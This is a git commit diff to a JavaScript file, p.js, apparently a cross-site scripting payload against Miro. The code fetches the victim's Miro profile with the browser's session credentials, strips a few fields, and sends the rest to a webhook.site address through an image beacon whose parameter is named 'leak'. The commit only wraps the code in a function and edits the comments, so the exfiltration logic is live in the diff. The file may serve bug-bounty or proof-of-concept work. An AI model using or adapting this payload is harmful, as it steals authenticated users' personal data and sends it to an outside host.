fe167cba0e90dcf801b21ebb61e516718189be86
n3vrm1ndcodeV1 <n3vrm1ndcode@gmail.com>
2025-08-06 13:39:34 +0100

    Update p.js

--- p.js
+++ p.js
@@ -1,10 +1,11 @@
-fetch("https://miro.com/api/v1/profile/", {
+(() => {
+  fetch("https://miro.com/api/v1/profile/", {
     method: "GET",
     credentials: "include"
   })
     .then(res => res.json())
     .then(profileData => {
-      // remove unwanted keys to not overload
+      // Remove unwanted keys
       const {
         achievements,
         subscriptions,
@@ -14,7 +15,7 @@ fetch("https://miro.com/api/v1/profile/", {
         ...slimProfileData
       } = profileData;
 
-      // reducing profile via image beacon
+      // Send reduced profile via image beacon
       const img = new Image();
       img.src = "https://webhook.site/6f357c7b-0aa6-435d-b9d6-24b85f931aea?leak=" +
         encodeURIComponent(JSON.stringify(slimProfileData));
